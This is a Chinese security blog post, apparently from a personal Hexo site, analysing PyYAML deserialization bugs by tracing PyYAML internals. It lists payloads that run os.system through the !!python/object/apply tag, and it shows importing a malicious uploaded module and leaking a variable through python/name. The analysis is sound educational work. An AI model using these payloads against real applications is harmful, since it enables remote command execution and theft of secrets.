@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>PyYaml反序列化 - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="PyYaml反序列化 - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://boogipop.com/2023/03/02/PyYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-02T09:37:02.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/At-Dawn/">At Dawn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>2,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">PyYaml反序列化</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="YAML基本语法"><a href="#YAML基本语法" class="headerlink" title="YAML基本语法"></a>YAML基本语法</h1><p>基本语法就自行参考菜鸟教程或者是其他的教程，挺简单的，一共就三种类型：数组，对象，纯量<br>可以用这个例子全部理解一下：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">string_0:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Boogipop</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;I&#x27;m Tr0y&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;I am fine. \u263A&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;\\x0d\\x0a is \\r\\n&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">newline</span></span><br><span class="line">      <span class="string">newline2</span>  <span class="comment"># 字符串可以拆成多行，每行之间用空格隔开</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &gt; 可以在字符串中折叠换行</span></span><br><span class="line"><span class="attr">string_1:</span> <span class="string">&gt;</span></span><br><span class="line"><span class="string">    newline</span></span><br><span class="line"><span class="string">    newline2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="comment"># | 保留换行符</span></span><br><span class="line"><span class="attr">string_2:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    newline</span></span><br><span class="line"><span class="string">    newline2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="comment"># | 保留换行符，且去掉最后一个换行符</span></span><br><span class="line"><span class="attr">string_3:</span> <span class="string">|-</span></span><br><span class="line"><span class="string">    newline</span></span><br><span class="line"><span class="string">    newline2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="attr">list:</span> <span class="meta">&amp;id_1</span></span><br><span class="line"><span class="bullet">-</span> <span class="number">18</span>  <span class="comment"># 定义锚点</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">cm</span></span><br><span class="line"></span><br><span class="line"><span class="attr">two_dimensional_list:</span></span><br><span class="line"><span class="bullet">-</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Boogipop</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Tr0y</span></span><br><span class="line"></span><br><span class="line"><span class="attr">boolean:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="literal">TRUE</span>  <span class="comment"># true、True、Yes、YES、yes、ON、on、On 都可以</span></span><br><span class="line">    <span class="bullet">-</span> <span class="literal">FALSE</span>  <span class="comment"># false、False、NO、no、No、off、OFF、Off 都可以</span></span><br><span class="line"></span><br><span class="line"><span class="attr">float:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">3.14</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">6.8523015e+5</span>  <span class="comment"># 可以使用科学计数法</span></span><br><span class="line"></span><br><span class="line"><span class="attr">int:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">123</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">0b10100111010010101110</span>  <span class="comment"># 支持二进制表示</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">0x0a</span>  <span class="comment"># 支持十六进制表示</span></span><br><span class="line"></span><br><span class="line"><span class="attr">nulls:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="literal">null</span>  <span class="comment"># NULL 也 ok</span></span><br><span class="line">  <span class="bullet">-</span> <span class="literal">Null</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">~</span></span><br><span class="line">  <span class="bullet">-</span></span><br><span class="line"></span><br><span class="line"><span class="attr">date:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">2018-02-17</span>  <span class="comment"># 日期必须使用 ISO 8601 格式，即 yyyy-MM-dd</span></span><br><span class="line"></span><br><span class="line"><span class="attr">datetime:</span></span><br><span class="line">    <span class="bullet">-</span>  <span class="number">2018-02-17T15:02:31+08:00</span>  <span class="comment"># 时间使用 ISO 8601 格式，时间和日期之间使用 T 连接，最后使用 + 代表时区</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &gt; 可以在字符串中折叠换行</span></span><br><span class="line"><span class="attr">object:</span> <span class="meta">&amp;id_2</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Tr0y</span></span><br><span class="line">    <span class="attr">money:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">json:</span> [&#123;<span class="attr">1:</span> <span class="string">Boogipop</span>, <span class="attr">2:</span> <span class="string">Tr0y</span>&#125;, <span class="string">&quot;???&quot;</span>]  <span class="comment"># 值支持 json</span></span><br><span class="line"></span><br><span class="line"><span class="attr">reference:</span></span><br><span class="line">    <span class="attr">size:</span> <span class="meta">*id_1</span></span><br><span class="line">    <span class="string">&lt;&lt;:</span> <span class="meta">*id_2</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;TestYM.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">y=yaml.load(f)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br></pre></td></tr></table></figure>
+<p>可以自行运行，输出结果和JSON格式一样</p>
+<h1 id="PyYAML的类型转换"><a href="#PyYAML的类型转换" class="headerlink" title="PyYAML的类型转换"></a>PyYAML的类型转换</h1><p>在PY中增加了一个新的特性，那就是yaml的类型转换，这也是PyYAML反序列化漏洞的关键点所在。在PyYAML中通过<code>!!</code>进行强制类型转换，也就是说<code>a: !!str 1</code>和<code>a: &quot;1&quot;</code>是一样的，也可以强转为任意的类型，下表是一个汇总图：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676260664452-6ac4d3c3-3edf-420f-8c1c-a04eccdee29e.png#averageHue=%23f1f1f1&clientId=ua40314fa-57df-4&from=paste&id=uc142ed83&originHeight=1318&originWidth=1310&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=uae0b7efe-ea29-4e4f-9ce1-952ac5f345f&title="><br>就以上面的<code>a: !!str 1</code>为例，我们调试分析：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676263507014-c4dfa04a-ad38-4613-b870-8c2b70de8948.png#averageHue=%236a8a77&clientId=ua40314fa-57df-4&from=paste&height=862&id=u5883a25d&name=image.png&originHeight=1078&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=242163&status=done&style=none&taskId=uc29ef647-a334-41d2-b15b-59b6845b883&title=&width=1536" alt="image.png"><br>在loader方法之后就加载出了<code>yaml_multi_constructors</code>变量，内置了很多tag，我们跟进：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676263583816-afd4718a-7f8a-4d01-acf5-389ecb26ee00.png#averageHue=%2351564b&clientId=ua40314fa-57df-4&from=paste&height=500&id=uaac2243d&name=image.png&originHeight=625&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=190165&status=done&style=none&taskId=ua7015797-9a34-492f-98ac-749a1e884a6&title=&width=1536" alt="image.png"><br>这里存放的是加载器，从图中可以知道有五种加载器，而默认的就是constructor，而这个默认的加载器加了很多强制类型转换的tag：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676263688342-abae3f28-7ae1-483c-a115-68084ac22ee6.png#averageHue=%23ab804b&clientId=ua40314fa-57df-4&from=paste&height=371&id=uca369006&name=image.png&originHeight=464&originWidth=1452&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=109187&status=done&style=none&taskId=u4fb03b95-1a74-458c-91b9-20f9786e2f0&title=&width=1161.6" alt="image.png"><br>而这些就是今天我们所讲的PyYAML反序列化漏洞的成因，详细的东西我们之后再分析</p>
+<h1 id="YAML版本-lt-5-1攻击思路"><a href="#YAML版本-lt-5-1攻击思路" class="headerlink" title="YAML版本&lt;5.1攻击思路"></a>YAML版本&lt;5.1攻击思路</h1><p>在yaml早期版本有很多危险tag，因此产生了yaml反序列化漏洞，而对应Tag就是上述图片中我圈起来的几个tag</p>
+<h2 id="python-x2F-object-x2F-apply"><a href="#python-x2F-object-x2F-apply" class="headerlink" title="python&#x2F;object&#x2F;apply"></a>python&#x2F;object&#x2F;apply</h2><p><code>python/object/apply</code>tag对应python函数中的<code>construct_python_object_apply</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676292471137-c4852751-51f6-4246-9972-ba601c7c7e90.png#averageHue=%232e2b2b&clientId=u2b808aba-ede4-4&from=paste&height=215&id=u0546a187&name=image.png&originHeight=269&originWidth=1381&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44134&status=done&style=none&taskId=uc74c72bf-6c78-4a29-a5dc-0bbc52fc034&title=&width=1104.8" alt="image.png"><br>再往下就是进入到<code>make_python_instance</code>函数中：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676292488902-f15543b2-b3cf-4d1c-a5ba-6f8da956a86e.png#averageHue=%232f2b2a&clientId=u2b808aba-ede4-4&from=paste&height=123&id=u7e8855a6&name=image.png&originHeight=154&originWidth=1121&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35399&status=done&style=none&taskId=u1dc33490-ae0c-4125-add2-f53d836c7cd&title=&width=896.8" alt="image.png"><br>继续往下跟进，进入make_python_instance函数中：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676292525367-0ab89213-649a-423e-adfc-bbd0a92d8e8d.png#averageHue=%232e2c2b&clientId=u2b808aba-ede4-4&from=paste&height=222&id=u3bbc4927&name=image.png&originHeight=277&originWidth=1425&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=64894&status=done&style=none&taskId=ud46c3533-dba6-4acf-9d7b-af0767636e3&title=&width=1140" alt="image.png"><br>通过<code>find_python_name</code>函数找到了system模块：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676292665103-f54b4b7f-9d59-4e14-ab4a-f91796e98e2c.png#averageHue=%232e2c2b&clientId=u2b808aba-ede4-4&from=paste&height=326&id=u7b21fe96&name=image.png&originHeight=407&originWidth=1474&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=91865&status=done&style=none&taskId=ue5f0b654-bde0-4331-b5bb-7e3507950a3&title=&width=1179.2" alt="image.png"><br>最后在<code>return cls(*args, **kwds)</code>中触发命令执行，cls就是system模块，args就是whoami：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676293094268-d7665339-ecf7-413b-89fc-d126c9d35602.png#averageHue=%232e2c2c&clientId=u2b808aba-ede4-4&from=paste&height=286&id=ud39ac1ee&name=image.png&originHeight=357&originWidth=1333&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55707&status=done&style=none&taskId=uebb55cb1-a854-4122-a5a1-f31297be704&title=&width=1066.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676293111801-9c3fc896-bbc9-4b07-a80a-fa7b7cb39505.png#averageHue=%232c2c2c&clientId=u2b808aba-ede4-4&from=paste&height=213&id=u5bf5cdd1&name=image.png&originHeight=266&originWidth=1901&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36121&status=done&style=none&taskId=uc381a0b1-9faf-433f-86ad-68727f16c5a&title=&width=1520.8" alt="image.png"><br>这就是完整的触发流程，细看其实Pyyaml反序列化的流程并不难，因为触发起来就是这几个地方，以下是<code>python/object/apply</code>链的各种形式的payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">yaml.load(<span class="string">&#x27;exp: !!python/object/apply:os.system [&quot;whoami&quot;]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;exp: !!python/object/apply:os.system [&#x27;whoami&#x27;]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 引号当然不是必须的</span></span><br><span class="line">yaml.load(<span class="string">&quot;exp: !!python/object/apply:os.system [whoami]&quot;</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">exp: !!python/object/apply:os.system</span></span><br><span class="line"><span class="string">- whoami</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">exp: !!python/object/apply:os.system</span></span><br><span class="line"><span class="string">  args: [&quot;whoami&quot;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># command 是 os.system 的参数名</span></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">exp: !!python/object/apply:os.system</span></span><br><span class="line"><span class="string">  kwds: &#123;&quot;command&quot;: &quot;whoami&quot;&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;!!python/object/apply:os.system [whoami]: exp&quot;</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;!!python/object/apply:os.system [whoami]&quot;</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/apply:os.system</span></span><br><span class="line"><span class="string">- whoami</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="python-x2F-object-x2F-new"><a href="#python-x2F-object-x2F-new" class="headerlink" title="python&#x2F;object&#x2F;new"></a>python&#x2F;object&#x2F;new</h2><p><code>python/object/new</code>标签对应的函数是<code>construct_python_object_new</code>:<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676293405148-48c5f830-3132-4275-b866-5a1d24cf1021.png#averageHue=%23302a2a&clientId=u2b808aba-ede4-4&from=paste&height=113&id=u2a98115b&name=image.png&originHeight=141&originWidth=1236&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21333&status=done&style=none&taskId=u3cabf3bd-cd61-4e18-ad88-25c8a044b8f&title=&width=988.8" alt="image.png"><br>而这个<code>construct_python_object_apply</code>实际上就是上面分析的<code>python/object/apply</code>tag对应的函数，也就是new实际上是apply的一个封装，那也就是说payload一模一样了，这里就不放出来了</p>
+<h2 id="python-x2F-object"><a href="#python-x2F-object" class="headerlink" title="python&#x2F;object"></a>python&#x2F;object</h2><p>该标签对应的函数为<code>construct_python_object</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676293511541-edb14bcd-78c0-43f0-a633-ce3a5924cf35.png#averageHue=%2383654b&clientId=u2b808aba-ede4-4&from=paste&height=203&id=u9ec0dba2&name=image.png&originHeight=254&originWidth=1187&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47443&status=done&style=none&taskId=u50f6e33b-6f05-4c7d-8384-b431702b6f2&title=&width=949.6" alt="image.png"><br>可以看到这个函数也是调用了<code>make_python_instance</code>，但是唯一不同的点就是没有参数，也就是只能通过无参方法命令执行<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676293865192-75822a18-f432-4474-9b53-205c91888e40.png#averageHue=%235d5849&clientId=u2b808aba-ede4-4&from=paste&height=846&id=ue17561e5&name=image.png&originHeight=1057&originWidth=1879&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=156068&status=done&style=none&taskId=u0a66267a-c295-4c6c-baa1-fc5c7c8fb48&title=&width=1503.2" alt="image.png"><br>这个payload虽然可以输出copyright，但是会报错，这个错误证明了是一个bug，在5.3版本进行了修复：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676294174548-549b467f-9ae8-49b2-b6d5-bd45f9e41043.png#averageHue=%232d2b2a&clientId=u2b808aba-ede4-4&from=paste&height=311&id=u8e5845e4&name=image.png&originHeight=389&originWidth=1220&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56081&status=done&style=none&taskId=u0965ac26-156f-4af1-840c-9643ae67f59&title=&width=976" alt="image.png"><br>这里的object本应该是instance，object类是不允许别setattr修改的，所以会报错</p>
+<h2 id="python-x2F-module-package-class"><a href="#python-x2F-module-package-class" class="headerlink" title="python&#x2F;module:package.class"></a>python&#x2F;module:package.class</h2><p>对应函数为<code> construct_python_module</code>，而该函数最终调用了<code>find_python_module</code>，(前面是find_python_name）这个函数中调用了<code>__import__</code>:<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676294254064-311e737c-3c7b-40fc-82f0-d3f83aa072e6.png#averageHue=%232e2b2b&clientId=u2b808aba-ede4-4&from=paste&height=210&id=u6a1d2cfd&name=image.png&originHeight=262&originWidth=1079&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40869&status=done&style=none&taskId=uaf4a6fdb-eeca-4f45-a2dd-6e5972981ca&title=&width=863.2" alt="image.png"><br>我们可以自定义一个恶意py，通过该标签即可import，也就导致了命令执行，在PYYAML.py文件下创建uploads文件夹，在里面放入恶意py：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676294370356-95b7687c-9673-4232-9392-f0317d83af4c.png#averageHue=%234e4d44&clientId=u2b808aba-ede4-4&from=paste&height=226&id=uc87c0e1e&name=image.png&originHeight=282&originWidth=1910&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48612&status=done&style=none&taskId=u3a8e818b-e46a-4dd8-a9f3-7d5d90e7f2b&title=&width=1528" alt="image.png"><br>接着通过该标签强制转换类型即可触发：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676294439490-0770e97b-5ae6-4f7f-a9fd-770321c45768.png#averageHue=%23585447&clientId=u2b808aba-ede4-4&from=paste&height=794&id=ucae591f8&name=image.png&originHeight=992&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=123642&status=done&style=none&taskId=u0b32b388-a154-4445-9bbe-dc404e5d4ab&title=&width=1536" alt="image.png"><br>这里的命令可以改为反弹shell之类的^^</p>
+<h2 id="python-x2F-name"><a href="#python-x2F-name" class="headerlink" title="python&#x2F;name"></a>python&#x2F;name</h2><p>该方法对应的函数为<code>construct_python_name</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676294673790-c23fe182-a851-42d1-b09e-8476bf56081a.png#averageHue=%232e2b2a&clientId=u2b808aba-ede4-4&from=paste&height=202&id=ucd684997&name=image.png&originHeight=252&originWidth=1266&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48807&status=done&style=none&taskId=ufcf37be7-b2b8-4b96-92e2-e7d3e3e8084&title=&width=1012.8" alt="image.png"><br>里面调用了find_python_name方法，这个方法在前三个标签中也有用到，是找模块或者属性用的，我们调试分析一波：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import yaml</span></span><br><span class="line"><span class="comment"># yaml.load(&#x27;boogipop: !!python/module:uploads.evil&#x27;)</span></span><br><span class="line"><span class="comment"># # a=yaml.load(&#x27;a: !!str 1&#x27;)</span></span><br><span class="line"><span class="comment"># # print(a)</span></span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TOKEN = <span class="string">&quot;Y0u_Nev3r_kn0w.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">config</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        token = yaml.load(config).get(<span class="string">&quot;token&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        token = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> token == TOKEN:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;yes, master.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;fuck off!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">config = <span class="string">&#x27;token: !!python/name:__main__.TOKEN&#x27;</span>  <span class="comment"># 可控输入点</span></span><br><span class="line">check(config)</span><br></pre></td></tr></table></figure>
+<p>在这个标签中可以用来窃取变量的值，如上述例子：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676294751389-74c718e4-83dd-4a5d-b768-428256e3e147.png#averageHue=%23796344&clientId=u2b808aba-ede4-4&from=paste&height=179&id=ue6110cbb&name=image.png&originHeight=224&originWidth=1442&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=59558&status=done&style=none&taskId=u4c8ce228-3b96-4ffa-a8ec-abfc55f8a41&title=&width=1153.6" alt="image.png"><br>进入方法中：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676294864228-e46c350d-5ab3-4c18-9fdd-b12fa7e1d999.png#averageHue=%23564f42&clientId=u2b808aba-ede4-4&from=paste&height=415&id=uef7c8b6f&name=image.png&originHeight=519&originWidth=1428&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=101778&status=done&style=none&taskId=ub1cfbc13-7ac5-4514-a268-c9d81c61b6e&title=&width=1142.4" alt="image.png"><br>module_name为__main__，然后object_name就是我们的TOKEN,最后返回的就是<code>__main__[&#39;object_name&#39;]</code>也就是TOKEN的值</p>
+<h1 id="版本-gt-5-1攻击思路"><a href="#版本-gt-5-1攻击思路" class="headerlink" title="版本&gt;5.1攻击思路"></a>版本&gt;5.1攻击思路</h1><p>由于默认的构造器太过强大，开发人员不了解这些危险很容易中招。所以 PyYAML 的开发者就将构造器分为：</p>
+<ol>
+<li>BaseConstructor：没有任何强制类型转换</li>
+<li>SafeConstructor：只有基础类型的强制类型转换</li>
+<li>FullConstructor：除了 python&#x2F;object&#x2F;apply 之外都支持，但是加载的模块必须位于 sys.modules 中（说明已经主动 import 过了才让加载）。这个是默认的构造器。</li>
+<li>UnsafeConstructor：支持全部的强制类型转换</li>
+<li>Constructor：等同于 UnsafeConstructor</li>
+</ol>
+<p>对应顶层的方法新增了：</p>
+<ol>
+<li>yaml.full_load</li>
+<li>yaml.full_load_all</li>
+<li>yaml.unsafe_load</li>
+<li>yaml.unsafe_load_all</li>
+</ol>
+<p>通常情况下，我们还是会使用 yaml.load，这个时候会有 warning：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676295932281-6f9c34d4-7f93-46f8-982d-4a12263aa389.png#averageHue=%232f2c2c&clientId=u4f2b0c03-b33a-4&from=paste&height=110&id=u6b88926c&name=image.png&originHeight=137&originWidth=1835&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25660&status=done&style=none&taskId=u81f0469e-7201-4ff3-8e1b-0f40c8b054e&title=&width=1468" alt="image.png"></p>
